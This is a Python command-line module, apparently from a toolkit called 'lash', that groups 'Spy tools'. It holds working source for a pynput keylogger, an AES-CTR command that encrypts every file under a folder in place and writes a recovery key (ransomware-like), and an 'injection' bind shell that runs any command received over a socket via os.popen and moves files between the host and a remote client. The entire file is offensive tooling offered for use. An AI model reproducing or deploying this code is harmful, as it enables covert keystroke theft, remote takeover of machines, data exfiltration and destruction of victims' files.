import os
import click
import shutil
import socket
import pyaes as pya
from datetime import datetime
from pynput.keyboard import Listener
from lash.Exportables.ikeyboard import *


@click.group('spy', help='Spy tools')
def spy():
    ...


@spy.command(help='Keylogger')
@click.option('-p', type=click.Path(exists=True), default='.', help='Path to send output file with info')
def keyboard(p):
    print('<running> f3 to stop')
    os.chdir(p)
    listener = Listener(on_press=key_down, on_release=key_up)
    listener.start()
    listener.join()
    print(f'> Process Finished <')


@spy.command()
@click.argument('p', metavar='path', type=click.Path(exists=True), required=False, default='.')
@click.argument('key', metavar='<key>', type=click.STRING)
@click.option('-dc', is_flag=True, default=False, help='Decrypt file')
@click.option('-ex', is_flag=True, default=False, help='Export key to text file')
@click.option('-cl', is_flag=True, default=False, help='Crypt all files in a folder')
def crypt(p, key, dc, ex, cl):
    """\b
    Encrypt/Decrypt files with AES algorithm

    \b
    Save the <key> you need her to decode
    The key NEED have 16 characters (128bits)
    \b
    Ex: crypt -ex ...\text.txt $kvzis1@7y602qsx
    """
    bkey = str.encode(key)  # Convert to bytes
    if p.find('\\') == -1 or p.find('/') == -1:
        fp = os.path.join('.', p)
    else:
        fp = p
    if dc:
        file = open(fp, 'rb')
        crip = pya.AESModeOfOperationCTR(bkey)
        data = crip.decrypt(file.read())
        crypted = open(fp, 'wb')
        crypted.write(data)
        print(f'\nFile decrypted successfully')
    else:
        if cl:
            try:
                os.chdir(fp)
            except:
                print(f'\nError the path {fp} is not valid!')
                return
            for root, folder, files in os.walk('.'):
                for file in files:
                    file_value = open(os.path.join(root, file), 'rb')
                    crip = pya.AESModeOfOperationCTR(bkey)
                    data = crip.encrypt(file_value.read())
                    file_value.close()
                    crypted = open(os.path.join(root, file), 'wb')
                    crypted.write(data)
        else:
            file = open(fp, 'rb')
            crip = pya.AESModeOfOperationCTR(bkey)
            data = crip.encrypt(file.read())
            file.close()
            crypted = open(fp, 'wb')
            crypted.write(data)
        if ex:
            if os.name == 'nt':
                if not cl:
                    os.chdir(fp[:fp.rfind('\\')])
                else:
                    pass
            else:
                if not cl:
                    os.chdir(fp[:fp.rfind('\\')])
                pass
            open('recovery-key.txt', 'w').write(key)
        print(f'\nFile(s) encrypted with key: {key}')


@spy.command(help='Command injection')
@click.option('-h', '-host', type=click.STRING, help='Host this machine for remote access, pass the port Ex: -h 8080')
@click.option('-c', '-connect', type=click.STRING, nargs=2, help='Connect to a host by it\' IP, port. Ex: -c 192.168.1.1 8080')
def injection(h, c):
    buffer = 1024 ** 2
    if h:
        try:
            h = int(h)
        except ValueError as error:
            print(f'{error}: Invalid port {h}, the value needs be a integer number like 4254 or 8234')
            return
        host = socket.gethostbyname(socket.gethostname())
        port = h
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((host, port))
            print(f'Server online [ host: {host}, port: {port} ] Waiting a connection...')
            s.listen()
            conn, addr = s.accept()
            with conn:
                print(f'Client connected: {addr}')
                while conn:
                    conn.sendall(bytes(os.getcwd(), 'utf-8'))
                    data = conn.recv(buffer).decode('utf-8')
                    if data.strip().split()[0] == '-chdir':
                        os.chdir(data.strip().split()[1])
                    elif data.strip().split()[0] == '-copy':
                        file_name = ' '.join(data.strip().split()[len(data[0]):])
                        with open(file_name, 'r') as file:
                            content = file.read()
                        conn.send(bytes(file_name, 'utf-8'))
                        conn.send(bytes(content, 'utf-8'))
                    elif data.strip().split()[0] == '-move':
                        file_name = conn.recv(buffer).decode('utf-8')
                        file_data = conn.recv(buffer).decode('utf-8')
                        with open(file_name, 'w') as file:
                            file.write(file_data)
                        conn.send(bytes(f'File: {file_name} has been copied to {os.getcwd()}', 'utf-8'))
                    elif data == '-quit':
                        quit(0)
                    else:
                        try:
                            output = os.popen(data).read()
                            conn.send(bytes(output, 'utf-8'))
                        except Exception as e:
                            conn.send(bytes(f'Command failed: {e}'))
                        print(f'({datetime.now().time()}) Command executed: {data}')
            quit(0)
    elif c:
        host, port = c
        try:
            port = int(port)
        except ValueError as error:
            print(f'{error}: Invalid port {port}, the value needs be a integer number like 4254 or 8234')
            return
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, port))
            print('\nConnected successfully, remote injection is now active')
            print('You need to use the custom commands instead the system defaults\n')
            print(f'{"-"*24}   Custom commands   {"-"*24}')
            print('[-chdir path]          Change the the remote directory')
            print('[-start x]             Start something on host ')
            print('[-quit]                Kill server')
            print('[-copy path_host]      Copy a file from host to your machine')
            print('[-move path_local]     Move a file from your machine to host')
            print('Move/Copy, gonna affect the local directory (host or client) ')
            print('\nCaution! if you send a incorrect command, the connection will be lost\n')
            while True:
                path = s.recv(buffer).decode('utf-8')
                command = str(input(f'{path}>>> '))
                if command.split()[0] == '-copy':
                    s.sendall(bytes(command, 'utf-8'))
                    file_name = s.recv(buffer).decode('utf-8')
                    file_data = s.recv(buffer).decode('utf-8')
                    with open(file_name, 'w') as file:
                        file.write(file_data)
                    print(f'{file_name} has been copied to {os.getcwd()}')
                elif command.split()[0] == '-move':
                    file_name = ' '.join(command.strip().split()[len(command[0]):])
                    s.send(bytes('-move', 'utf-8'))
                    with open(file_name, 'r') as file:
                        content = file.read()
                    s.send(bytes(file_name, 'utf-8'))
                    s.send(bytes(content, 'utf-8'))
                    msg = s.recv(buffer).decode('utf-8')
                    print(msg)
                elif command.split()[0] == '-quit':
                    s.sendall(bytes(command, 'utf-8'))
                    quit(0)
                elif command.split()[0] == '-chdir':
                    s.sendall(bytes(command, 'utf-8'))
                else:
                    s.sendall(bytes(command, 'utf-8'))
                    print(s.recv(buffer).decode('utf-8'))
    else:
        print('Error: No option passed')
